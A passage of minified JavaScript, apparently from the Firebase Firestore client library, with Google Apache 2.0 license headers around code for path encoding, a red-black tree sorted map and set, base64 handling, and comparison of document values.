 */function dn(e){let t="";for(let n=0;n<e.length;n++)t.length>0&&(t=Uw(t)),t=n$(e.get(n),t);return Uw(t)}function n$(e,t){let n=t;const r=e.length;for(let t=0;t<r;t++){const r=e.charAt(t);switch(r){case"\0":n+="";break;case"":n+="";break;default:n+=r}}return n}function Uw(e){return e+""}function pr(e){const t=e.length;if(te(t>=2),2===t)return te(""===e.charAt(0)&&""===e.charAt(1)),Te.emptyPath();const n=t-2,r=[];let i="";for(let s=0;s<t;){const t=e.indexOf("",s);switch((t<0||t>n)&&G(),e.charAt(t+1)){case"":const n=e.substring(s,t);let o;0===i.length?o=n:(i+=n,o=i,i=""),r.push(o);break;case"":i+=e.substring(s,t),i+="\0";break;case"":i+=e.substring(s,t+1);break;default:G()}s=t+2}return new Te(r)}
/**
 * @license
 * Copyright 2022 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */wn.ct=-1;const zw=["userId","batchId"];
/**
 * @license
 * Copyright 2022 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function eh(e,t){return[e,dn(t)]}function ex(e,t,n){return[e,dn(t),n]}const r$={},i$=["prefixPath","collectionGroup","readTime","documentId"],s$=["prefixPath","collectionGroup","documentId"],o$=["collectionGroup","readTime","prefixPath","documentId"],a$=["canonicalId","targetId"],l$=["targetId","path"],u$=["path","targetId"],c$=["collectionId","parent"],h$=["indexId","uid"],d$=["uid","sequenceNumber"],f$=["indexId","uid","arrayValue","directionalValue","orderedDocumentKey","documentKey"],p$=["indexId","uid","orderedDocumentKey"],m$=["userId","collectionPath","documentId"],g$=["userId","collectionPath","largestBatchId"],y$=["userId","collectionGroup","largestBatchId"],tx=["mutationQueues","mutations","documentMutations","remoteDocuments","targets","owner","targetGlobal","targetDocuments","clientMetadata","remoteDocumentGlobal","collectionParents","bundles","namedQueries"],v$=[...tx,"documentOverlays"],nx=["mutationQueues","mutations","documentMutations","remoteDocumentsV14","targets","owner","targetGlobal","targetDocuments","clientMetadata","remoteDocumentGlobal","collectionParents","bundles","namedQueries","documentOverlays"],rx=nx,w$=[...rx,"indexConfiguration","indexState","indexEntries"];
/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Jm extends JT{constructor(e,t){super(),this.at=e,this.currentSequenceNumber=t}}function Ft(e,t){const n=q(e);return er.M(n.at,t)}
/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function Bw(e){let t=0;for(const n in e)Object.prototype.hasOwnProperty.call(e,n)&&t++;return t}function eo(e,t){for(const n in e)Object.prototype.hasOwnProperty.call(e,n)&&t(n,e[n])}function ix(e){for(const t in e)if(Object.prototype.hasOwnProperty.call(e,t))return!1;return!0}
/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Be{constructor(e,t){this.comparator=e,this.root=t||jt.EMPTY}insert(e,t){return new Be(this.comparator,this.root.insert(e,t,this.comparator).copy(null,null,jt.BLACK,null,null))}remove(e){return new Be(this.comparator,this.root.remove(e,this.comparator).copy(null,null,jt.BLACK,null,null))}get(e){let t=this.root;for(;!t.isEmpty();){const n=this.comparator(e,t.key);if(0===n)return t.value;n<0?t=t.left:n>0&&(t=t.right)}return null}indexOf(e){let t=0,n=this.root;for(;!n.isEmpty();){const r=this.comparator(e,n.key);if(0===r)return t+n.left.size;r<0?n=n.left:(t+=n.left.size+1,n=n.right)}return-1}isEmpty(){return this.root.isEmpty()}get size(){return this.root.size}minKey(){return this.root.minKey()}maxKey(){return this.root.maxKey()}inorderTraversal(e){return this.root.inorderTraversal(e)}forEach(e){this.inorderTraversal(((t,n)=>(e(t,n),!1)))}toString(){const e=[];return this.inorderTraversal(((t,n)=>(e.push(`${t}:${n}`),!1))),`{${e.join(", ")}}`}reverseTraversal(e){return this.root.reverseTraversal(e)}getIterator(){return new Rc(this.root,null,this.comparator,!1)}getIteratorFrom(e){return new Rc(this.root,e,this.comparator,!1)}getReverseIterator(){return new Rc(this.root,null,this.comparator,!0)}getReverseIteratorFrom(e){return new Rc(this.root,e,this.comparator,!0)}}class Rc{constructor(e,t,n,r){this.isReverse=r,this.nodeStack=[];let i=1;for(;!e.isEmpty();)if(i=t?n(e.key,t):1,t&&r&&(i*=-1),i<0)e=this.isReverse?e.left:e.right;else{if(0===i){this.nodeStack.push(e);break}this.nodeStack.push(e),e=this.isReverse?e.right:e.left}}getNext(){let e=this.nodeStack.pop();const t={key:e.key,value:e.value};if(this.isReverse)for(e=e.left;!e.isEmpty();)this.nodeStack.push(e),e=e.right;else for(e=e.right;!e.isEmpty();)this.nodeStack.push(e),e=e.left;return t}hasNext(){return this.nodeStack.length>0}peek(){if(0===this.nodeStack.length)return null;const e=this.nodeStack[this.nodeStack.length-1];return{key:e.key,value:e.value}}}class jt{constructor(e,t,n,r,i){this.key=e,this.value=t,this.color=n??jt.RED,this.left=r??jt.EMPTY,this.right=i??jt.EMPTY,this.size=this.left.size+1+this.right.size}copy(e,t,n,r,i){return new jt(e??this.key,t??this.value,n??this.color,r??this.left,i??this.right)}isEmpty(){return!1}inorderTraversal(e){return this.left.inorderTraversal(e)||e(this.key,this.value)||this.right.inorderTraversal(e)}reverseTraversal(e){return this.right.reverseTraversal(e)||e(this.key,this.value)||this.left.reverseTraversal(e)}min(){return this.left.isEmpty()?this:this.left.min()}minKey(){return this.min().key}maxKey(){return this.right.isEmpty()?this.key:this.right.maxKey()}insert(e,t,n){let r=this;const i=n(e,r.key);return r=i<0?r.copy(null,null,null,r.left.insert(e,t,n),null):0===i?r.copy(null,t,null,null,null):r.copy(null,null,null,null,r.right.insert(e,t,n)),r.fixUp()}removeMin(){if(this.left.isEmpty())return jt.EMPTY;let e=this;return e.left.isRed()||e.left.left.isRed()||(e=e.moveRedLeft()),e=e.copy(null,null,null,e.left.removeMin(),null),e.fixUp()}remove(e,t){let n,r=this;if(t(e,r.key)<0)r.left.isEmpty()||r.left.isRed()||r.left.left.isRed()||(r=r.moveRedLeft()),r=r.copy(null,null,null,r.left.remove(e,t),null);else{if(r.left.isRed()&&(r=r.rotateRight()),r.right.isEmpty()||r.right.isRed()||r.right.left.isRed()||(r=r.moveRedRight()),0===t(e,r.key)){if(r.right.isEmpty())return jt.EMPTY;n=r.right.min(),r=r.copy(n.key,n.value,null,null,r.right.removeMin())}r=r.copy(null,null,null,null,r.right.remove(e,t))}return r.fixUp()}isRed(){return this.color}fixUp(){let e=this;return e.right.isRed()&&!e.left.isRed()&&(e=e.rotateLeft()),e.left.isRed()&&e.left.left.isRed()&&(e=e.rotateRight()),e.left.isRed()&&e.right.isRed()&&(e=e.colorFlip()),e}moveRedLeft(){let e=this.colorFlip();return e.right.left.isRed()&&(e=e.copy(null,null,null,null,e.right.rotateRight()),e=e.rotateLeft(),e=e.colorFlip()),e}moveRedRight(){let e=this.colorFlip();return e.left.left.isRed()&&(e=e.rotateRight(),e=e.colorFlip()),e}rotateLeft(){const e=this.copy(null,null,jt.RED,null,this.right.left);return this.right.copy(null,null,this.color,e,null)}rotateRight(){const e=this.copy(null,null,jt.RED,this.left.right,null);return this.left.copy(null,null,this.color,null,e)}colorFlip(){const e=this.left.copy(null,null,!this.left.color,null,null),t=this.right.copy(null,null,!this.right.color,null,null);return this.copy(null,null,!this.color,e,t)}checkMaxDepth(){const e=this.check();return Math.pow(2,e)<=this.size+1}check(){if(this.isRed()&&this.left.isRed()||this.right.isRed())throw G();const e=this.left.check();if(e!==this.right.check())throw G();return e+(this.isRed()?0:1)}}jt.EMPTY=null,jt.RED=!0,jt.BLACK=!1,jt.EMPTY=new class{constructor(){this.size=0}get key(){throw G()}get value(){throw G()}get color(){throw G()}get left(){throw G()}get right(){throw G()}copy(e,t,n,r,i){return this}insert(e,t,n){return new jt(e,t)}remove(e,t){return this}isEmpty(){return!0}inorderTraversal(e){return!1}reverseTraversal(e){return!1}minKey(){return null}maxKey(){return null}isRed(){return!1}checkMaxDepth(){return!0}check(){return 0}};
/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
class He{constructor(e){this.comparator=e,this.data=new Be(this.comparator)}has(e){return null!==this.data.get(e)}first(){return this.data.minKey()}last(){return this.data.maxKey()}get size(){return this.data.size}indexOf(e){return this.data.indexOf(e)}forEach(e){this.data.inorderTraversal(((t,n)=>(e(t),!1)))}forEachInRange(e,t){const n=this.data.getIteratorFrom(e[0]);for(;n.hasNext();){const r=n.getNext();if(this.comparator(r.key,e[1])>=0)return;t(r.key)}}forEachWhile(e,t){let n;for(n=void 0!==t?this.data.getIteratorFrom(t):this.data.getIterator();n.hasNext();)if(!e(n.getNext().key))return}firstAfterOrEqual(e){const t=this.data.getIteratorFrom(e);return t.hasNext()?t.getNext().key:null}getIterator(){return new jw(this.data.getIterator())}getIteratorFrom(e){return new jw(this.data.getIteratorFrom(e))}add(e){return this.copy(this.data.remove(e).insert(e,!0))}delete(e){return this.has(e)?this.copy(this.data.remove(e)):this}isEmpty(){return this.data.isEmpty()}unionWith(e){let t=this;return t.size<e.size&&(t=e,e=this),e.forEach((e=>{t=t.add(e)})),t}isEqual(e){if(!(e instanceof He)||this.size!==e.size)return!1;const t=this.data.getIterator(),n=e.data.getIterator();for(;t.hasNext();){const e=t.getNext().key,r=n.getNext().key;if(0!==this.comparator(e,r))return!1}return!0}toArray(){const e=[];return this.forEach((t=>{e.push(t)})),e}toString(){const e=[];return this.forEach((t=>e.push(t))),"SortedSet("+e.toString()+")"}copy(e){const t=new He(this.comparator);return t.data=e,t}}class jw{constructor(e){this.iter=e}getNext(){return this.iter.getNext().key}hasNext(){return this.iter.hasNext()}}function yo(e){return e.hasNext()?e.getNext():void 0}
/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Sn{constructor(e){this.fields=e,e.sort(gt.comparator)}static empty(){return new Sn([])}unionWith(e){let t=new He(gt.comparator);for(const e of this.fields)t=t.add(e);for(const n of e)t=t.add(n);return new Sn(t.toArray())}covers(e){for(const t of this.fields)if(t.isPrefixOf(e))return!0;return!1}isEqual(e){return ia(this.fields,e.fields,((e,t)=>e.isEqual(t)))}}
/**
 * @license
 * Copyright 2023 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class sx extends Error{constructor(){super(...arguments),this.name="Base64DecodeError"
/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */}}function S$(){return typeof atob<"u"}
/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Ct{constructor(e){this.binaryString=e}static fromBase64String(e){const t=function(e){try{return atob(e)}catch(e){throw typeof DOMException<"u"&&e instanceof DOMException?new sx("Invalid base64 string: "+e):e}}(e);return new Ct(t)}static fromUint8Array(e){const t=function(e){let t="";for(let n=0;n<e.length;++n)t+=String.fromCharCode(e[n]);return t}(e);return new Ct(t)}[Symbol.iterator](){let e=0;return{next:()=>e<this.binaryString.length?{value:this.binaryString.charCodeAt(e++),done:!1}:{value:void 0,done:!0}}}toBase64(){return e=this.binaryString,btoa(e);var e}toUint8Array(){return function(e){const t=new Uint8Array(e.length);for(let n=0;n<e.length;n++)t[n]=e.charCodeAt(n);return t}(this.binaryString)}approximateByteSize(){return 2*this.binaryString.length}compareTo(e){return ue(this.binaryString,e.binaryString)}isEqual(e){return this.binaryString===e.binaryString}}Ct.EMPTY_BYTE_STRING=new Ct("");const _$=new RegExp(/^\d{4}-\d\d-\d\dT\d\d:\d\d:\d\d(?:\.(\d+))?Z$/);function Li(e){if(te(!!e),"string"==typeof e){let t=0;const n=_$.exec(e);if(te(!!n),n[1]){let e=n[1];e=(e+"000000000").substr(0,9),t=Number(e)}const r=new Date(e);return{seconds:Math.floor(r.getTime()/1e3),nanos:t}}return{seconds:ut(e.seconds),nanos:ut(e.nanos)}}function ut(e){return"number"==typeof e?e:"string"==typeof e?Number(e):0}function Fi(e){return"string"==typeof e?Ct.fromBase64String(e):Ct.fromUint8Array(e)}
/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function Yd(e){var t,n;return"server_timestamp"===(null===(n=((null===(t=null==e?void 0:e.mapValue)||void 0===t?void 0:t.fields)||{}).__type__)||void 0===n?void 0:n.stringValue)}function ev(e){const t=e.mapValue.fields.__previous_value__;return Yd(t)?ev(t):t}function ou(e){const t=Li(e.mapValue.fields.__local_write_time__.timestampValue);return new et(t.seconds,t.nanos)}
/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class E${constructor(e,t,n,r,i,s,o,a){this.databaseId=e,this.appId=t,this.persistenceKey=n,this.host=r,this.ssl=i,this.forceLongPolling=s,this.autoDetectLongPolling=o,this.useFetchStreams=a}}class Vi{constructor(e,t){this.projectId=e,this.database=t||"(default)"}static empty(){return new Vi("","")}get isDefaultDatabase(){return"(default)"===this.database}isEqual(e){return e instanceof Vi&&e.projectId===this.projectId&&e.database===this.database}}
/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const vi={mapValue:{fields:{__type__:{stringValue:"__max__"}}}},th={nullValue:"NULL_VALUE"};function Vs(e){return"nullValue"in e?0:"booleanValue"in e?1:"integerValue"in e||"doubleValue"in e?2:"timestampValue"in e?3:"stringValue"in e?5:"bytesValue"in e?6:"referenceValue"in e?7:"geoPointValue"in e?8:"arrayValue"in e?9:"mapValue"in e?Yd(e)?4:ox(e)?9007199254740991:10:G()}function Sr(e,t){if(e===t)return!0;const n=Vs(e);if(n!==Vs(t))return!1;switch(n){case 0:case 9007199254740991:return!0;case 1:return e.booleanValue===t.booleanValue;case 4:return ou(e).isEqual(ou(t));case 3:return function(e,t){if("string"==typeof e.timestampValue&&"string"==typeof t.timestampValue&&e.timestampValue.length===t.timestampValue.length)return e.timestampValue===t.timestampValue;const n=Li(e.timestampValue),r=Li(t.timestampValue);return n.seconds===r.seconds&&n.nanos===r.nanos}(e,t);case 5:return e.stringValue===t.stringValue;case 6:return r=t,Fi(e.bytesValue).isEqual(Fi(r.bytesValue));case 7:return e.referenceValue===t.referenceValue;case 8:return function(e,t){return ut(e.geoPointValue.latitude)===ut(t.geoPointValue.latitude)&&ut(e.geoPointValue.longitude)===ut(t.geoPointValue.longitude)}(e,t);case 2:return function(e,t){if("integerValue"in e&&"integerValue"in t)return ut(e.integerValue)===ut(t.integerValue);if("doubleValue"in e&&"doubleValue"in t){const n=ut(e.doubleValue),r=ut(t.doubleValue);return n===r?su(n)===su(r):isNaN(n)&&isNaN(r)}return!1}(e,t);case 9:return ia(e.arrayValue.values||[],t.arrayValue.values||[],Sr);case 10:return function(e,t){const n=e.mapValue.fields||{},r=t.mapValue.fields||{};if(Bw(n)!==Bw(r))return!1;for(const e in n)if(n.hasOwnProperty(e)&&(void 0===r[e]||!Sr(n[e],r[e])))return!1;return!0}(e,t);default:return G()}var r}function au(e,t){return void 0!==(e.values||[]).find((e=>Sr(e,t)))}function Ui(e,t){if(e===t)return 0;const n=Vs(e),r=Vs(t);if(n!==r)return ue(n,r);switch(n){case 0:case 9007199254740991:return 0;case 1:return ue(e.booleanValue,t.booleanValue);case 2:return function(e,t){const n=ut(e.integerValue||e.doubleValue),r=ut(t.integerValue||t.doubleValue);return n<r?-1:n>r?1:n===r?0:isNaN(n)?isNaN(r)?0:-1:1}(e,t);case 3:return qw(e.timestampValue,t.timestampValue);case 4:return qw(ou(e),ou(t));case 5:return ue(e.stringValue,t.stringValue);case 6:return function(e,t){const n=Fi(e),r=Fi(t);return n.compareTo(r)}(e.bytesValue,t.bytesValue);case 7:return function(e,t){const n=e.split("/"),r=t.split("/");for(let e=0;e<n.length&&e<r.length;e++){const t=ue(n[e],r[e]);if(0!==t)return t}return ue(n.length,r.length)}(e.referenceValue,t.referenceValue);case 8:return function(e,t){const n=ue(ut(e.latitude),ut(t.latitude));return 0!==n?n:ue(ut(e.longitude),ut(t.longitude))}(e.geoPointValue,t.geoPointValue);case 9:return function(e,t){const n=e.values||[],r=t.values||[];for(let e=0;e<n.length&&e<r.length;++e){const t=Ui(n[e],r[e]);if(t)return t}return ue(n.length,r.length)}(e.arrayValue,t.arrayValue);case 10:return function(e,t){if(e===vi.mapValue&&t===vi.mapValue)return 0;if(e===vi.mapValue)return 1;if(t===vi.mapValue)return-1;const n=e.fields||{},r=Object.keys(n),i=t.fields||{},s=Object.keys(i);r.sort(),s.sort();for(let e=0;e<r.length&&e<s.length;++e){const t=ue(r[e],s[e]);if(0!==t)return t;const o=Ui(n[r[e]],i[s[e]]);if(0!==o)return o}return ue(r.length,s.length)}(e.mapValue,t.mapValue);default:throw G()}}function qw(e,t){if("string"==typeof e&&"string"==typeof t&&e.length===t.length)return ue(e,t);const n=Li(e),r=Li(t),i=ue(n.seconds,r.seconds);return 0!==i?i:ue(n.nanos,r.nanos)}function sa(e){return Zm(e)}function Zm(e){return"nullValue"in e?"null":"booleanValue"in e?""+e.booleanValue:"integerValue"in e?""+e.integerValue:"doubleValue"in e?""+e.doubleValue:"timestampValue"in e?function(e){const t=Li(e);return`time(${t.seconds},${t.nanos})`}(e.timestampValue):"stringValue"in e?e.stringValue:"bytesValue"in e?Fi(e.bytesValue).toBase64():"referenceValue"in e?(n=e.referenceValue,B.fromName(n).toString()):"geoPointValue"in e?`geo(${(t=e.geoPointValue).latitude},${t.longitude})`:"arrayValue"in e?function(e){let t="[",n=!0;for(const r of e.values||[])n?n=!1:t+=",",t+=Zm(r);return t+"]"}(e.arrayValue):"mapValue"in e?function(e){const t=Object.keys(e.fields||{}).sort();let n="{",r=!0;for(const i of t)r?r=!1:n+=",",n+=`${i}:${Zm(e.fields[i])}`;return n+"}"}(e.mapValue):G();var t,n}function Us(e,t){return{referenceValue:`projects/${e.projectId}/databases/${e.database}/documents/${t.path.canonicalString()}`}}function eg(e){return!!e&&"integerValue"in e}function lu(e){return!!e&&"arrayValue"in e}function Yw(e){return!!e&&"nullValue"in e}function Ww(e){return!!e&&"doubleValue"in e&&isNaN(Number(e.doubleValue))}function nh(e){return!!e&&"mapValue"in e}function kl(e){if(e.geoPointValue)return{geoPointValue:Object.assign({},e.geoPointValue)};if(e.timestampValue&&"object"==typeof e.timestampValue)return{timestampValue:Object.assign({},e.timestampValue)};if(e.mapValue){const t={mapValue:{fields:{}}};return eo(e.mapValue.fields,((e,n)=>t.mapValue.fields[e]=kl(n))),t}if(e.arrayValue){const t={arrayValue:{values:[]}};for(let n=0;n<(e.arrayValue.values||[]).length;++n)t.arrayValue.values[n]=kl(e.arrayValue.values[n]);return t}return Object.assign({},e)}function ox(e){return"__max__"===(((e.mapValue||{}).fields||{}).__type__||{}).stringValue}function T$(e){return"nullValue"in e?th:"booleanValue"in e?{booleanValue:!1}:"integerValue"in e||"doubleValue"in e?{doubleValue:NaN}:"timestampValue"in e?{timestampValue:{seconds:Number.MIN_SAFE_INTEGER}}:"stringValue"in e?{stringValue:""}:"bytesValue"in e?{bytesValue:""}:"referenceValue"in e?Us(Vi.empty(),B.empty()):"geoPointValue"in e?{geoPointValue:{latitude:-90,longitude:-180}}:"arrayValue"in e?{arrayValue:{}}:"mapValue"in e?{mapValue:{}}:G()}function x$(e){return"nullValue"in e?{booleanValue:!1}:"booleanValue"in e?{doubleValue:NaN}:"integerValue"in e||"doubleValue"in e?{timestampValue:{seconds:Number.MIN_SAFE_INTEGER}}:"timestampValue"in e?{stringValue:""}:"stringValue"in e?{bytesValue:""}:"bytesValue"in e?Us(Vi.empty(),B.empty()):"referenceValue"in e?{geoPointValue:{latitude:-90,longitude:-180}}:"geoPointValue"in e?{arrayValue:{}}:"arrayValue"in e?{mapValue:{}}:"mapValue"in e?vi:G()}function Gw(e,t){const n=Ui(e.value,t.value);return 0!==n?n:e.inclusive&&!t.inclusive?-1:!e.inclusive&&t.inclusive?1:0}function Hw(e,t){const n=Ui(e.value,t.value);return 0!==n?n:e.inclusive&&!t.inclusive?1:!e.inclusive&&t.inclusive?-1:0}
/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Yt{constructor(e){this.value=e}static empty(){return new Yt({mapValue:{}})}field(e){if(e.isEmpty())return this.value;{let t=this.value;for(let n=0;n<e.length-1;++n)if(t=(t.mapValue.fields||{})[e.get(n)],!nh(t))return null;return t=(t.mapValue.fields||{})[e.lastSegment()],t||null}}set(e,t){this.getFieldsMap(e.popLast())[e.lastSegment()]=kl(t)}setAll(e){let t=gt.emptyPath(),n={},r=[];e.forEach(((e,i)=>{if(!t.isImmediateParentOf(i)){const e=this.getFieldsMap(t);this.applyChanges(e,n,r),n={},r=[],t=i.popLast()}e?n[i.lastSegment()]=kl(e):r.push(i.lastSegment())}));const i=this.getFieldsMap(t);this.applyChanges(i,n,r)}delete(e){const t=this.field(e.popLast());nh(t)&&t.mapValue.fields&&delete t.mapValue.fields[e.lastSegment()]}isEqual(e){return Sr(this.value,e.value)}getFieldsMap(e){let t=this.value;t.mapValue.fields||(t.mapValue={fields:{}});for(let n=0;n<e.length;++n){let r=t.mapValue.fields[e.get(n)];nh(r)&&r.mapValue.fields||(r={mapValue:{fields:{}}},t.mapValue.fields[e.get(n)]=r),t=r}return t.mapValue.fields}applyChanges(e,t,n){eo(t,((t,n)=>e[t]=n));for(const t of n)delete e[t]}clone(){return new Yt(kl(this.value))}}function ax(e){const t=[];return eo(e.fields,((e,n)=>{const r=new gt([e]);if(nh(n)){const e=ax(n.mapValue).fields;if(0===e.length)t.push(r);else for(const n of e)t.push(r.child(n))}else t.push(r)})),new Sn(t)}
/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class We{constructor(e,t,n,r,i,s,o){this.key=e,this.documentType=t,this.version=n,this.readTime=r,this.createTime=i,this.data=s,this.documentState=o}static newInvalidDocument(e){return new We(e,0,ee.min(),ee.min(),ee.min(),Yt.empty(),0)}static newFoundDocument(e,t,n,r){return new We(e,1,t,ee.min(),n,r,0)}static newNoDocument(e,t){return new We(e,2,t,ee.min(),ee.min(),Yt.empty(),0)}static newUnknownDocument(e,t){return new We(e,3,t,ee.min(),ee.min(),Yt.empty(),2)}convertToFoundDocument(e,t){return!this.createTime.isEqual(ee.min())||2!==this.documentType&&0!==this.documentType||(this.createTime=e),this.version=e,this.documentType=1,this.data=t,this.documentState=0,this}convertToNoDocument(e){return this.version=e,this.documentType=2,this.data=Yt.empty(),this.documentState=0,this}convertToUnknownDocument(e){return this.version=e,this.documentType=3,this.data=Yt.empty(),this.documentState=2,this}setHasCommittedMutations(){return this.documentState=2,this}setHasLocalMutations(){return this.documentState=1,this.version=ee.min(),this}setReadTime(e){return this.readTime=e,this}get hasLocalMutations(){return 1===this.documentState}get hasCommittedMutations(){return 2===this.documentState}get hasPendingWrites(){return this.hasLocalMutations||this.hasCommittedMutations}isValidDocument(){return 0!==this.documentType}isFoundDocument(){return 1===this.documentType}isNoDocument(){return 2===this.documentType}isUnknownDocument(){return 3===this.documentType}isEqual(e){return e instanceof We&&this.key.isEqual(e.key)&&this.version.isEqual(e.version)&&this.documentType===e.documentType&&this.documentState===e.documentState&&this.data.isEqual(e.data)}mutableCopy(){return new We(this.key,this.documentType,this.version,this.readTime,this.createTime,this.data.clone(),this.documentState)}toString(){return`Document(${this.key}, ${this.version}, ${JSON.stringify(this.data.value)}, {createTime: ${this.createTime}}), {documentType: ${this.documentType}}), {documentState: ${this.documentState}})`}}
/**
 * @license
 * Copyright 2022 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
